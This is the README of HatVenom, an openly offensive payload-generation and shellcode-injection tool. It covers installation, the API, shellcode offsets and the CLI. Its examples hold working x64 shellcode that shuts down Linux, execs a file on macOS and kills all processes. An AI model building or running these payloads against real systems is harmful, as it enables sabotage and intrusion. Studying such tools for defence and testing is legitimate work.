# HatVenom

<p>
    <a href="https://entysec.netlify.app">
        <img src="https://img.shields.io/badge/developer-EntySec-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/HatVenom">
        <img src="https://img.shields.io/badge/language-Python-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/HatVenom/stargazers">
        <img src="https://img.shields.io/github/stars/EntySec/HatVenom?color=yellow">
    </a>
</p>

HatVenom is a HatSploit native powerful payload generation and shellcode injection tool that provides support for common platforms and architectures.

## Features

* Support for most common executable formats like `elf`, `macho`, `pe`.
* Support for most common architectures like `x64`, `x86`, `aarch64`, `armle`, `mipsle`, `mipsbe`.
* Ability to modify shellcode by changing pre-defined offsets.

## Installation

```shell
pip3 install git+https://github.com/EntySec/HatVenom
```

## Basic functions

There are all HatVenom basic functions that can be used to generate payload, covert data or inject shellcode.

* `generate(file_format, arch, shellcode, offsets={})` - Generates payload for specified target and with specified shellcode.
* `generate_to(file_format, arch, shellcode, offsets={}, filename='a.out')` - Generates payload for specified target and with specified shellcode and saves it to the specified file.

## Generating payload

It's very easy to generate payload for various targets in HatVenom. Let's generate a simple payload that calls shutdown for Linux and save it to `a.out`.

### Examples

```python
from hatvenom import HatVenom

shellcode = (
    b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"
    b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
    b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
    b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
    b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
    b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
    b"\x50\x48\x89\xe7\x52\x53\x51\x57"
    b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
    b"\x05"
)

hatvenom = HatVenom()
hatvenom.generate_to('elf', 'x64', shellcode)
```

## Payload offsets

Payload offsets is a variables used to add something to a shelcode on the preprocessing stage. Offsets looks like this:

```shell
\x90\x90\x90\x90:message:string:\x90\x90\x90\x90
```

Where `message` is an offset name and `string` is an offset type. So the basic usage of the offset looks like:

```shell
[shellcode]:[name]:[type]:[shellcode]
```

There are some possible offsets types:

* `string` - Plain text that will be converted to bytes on the preprocessing stage.
* `ip` - IP address that will be converted to bytes on the preprocessing stage.
* `port` - Numeric port that will be converted to bytes on the preprocessing stage.

So if you want to replace offset with bytes instead of `string`, `ip` and `port`, you can use this type:

```shell
[shellcode]:[name]:[shellcode]
```

### Examples

Let's generate a simple payload that executes provided through `file` offset file for macOS and save it to `a.out`.

```python
from hatvenom import HatVenom

shellcode = (
    b"\x48\x31\xf6\x56\x48\xbf"
    b":file:string:"
    b"\x57\x48\x89\xe7\x48\x31"
    b"\xd2\x48\x31\xc0\xb0\x02"
    b"\x48\xc1\xc8\x28\xb0\x3b"
    b"\x0f\x05"
)

hatvenom = HatVenom()
hatvenom.generate_to('macho', 'x64', shellcode, {'file':'//bin/ps'})
```

## HatVenom CLI

HatVenom also has their own command line interface that can be invoked by executing `hatvenom` command:

```
usage: hatvenom [-h] [--format FORMAT] [--arch ARCH] [--shellcode SHELLCODE]
                [--offsets OFFSETS] [-o OUTPUT]

Powerful payload generation and shellcode injection tool that provides support
for common platforms and architectures.

optional arguments:
  -h, --help            show this help message and exit
  --format FORMAT       Platform to generate for.
  --arch ARCH           Architecture to generate for.
  --shellcode SHELLCODE
                        Shellcode to inject.
  --offsets OFFSETS     Shellcode offsets.
  -o OUTPUT, --output OUTPUT
                        File to output generated payload.
```

### Examples

Let's generate a simple payload that kills all processes for Linux and save it to `a.out`.

```shell
hatvenom --format elf --arch x64 --shellcode "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
```

**NOTE:** If you want to use offsets in the CLI version of HatVenom, then you should use `--offsets one=1,two=2`
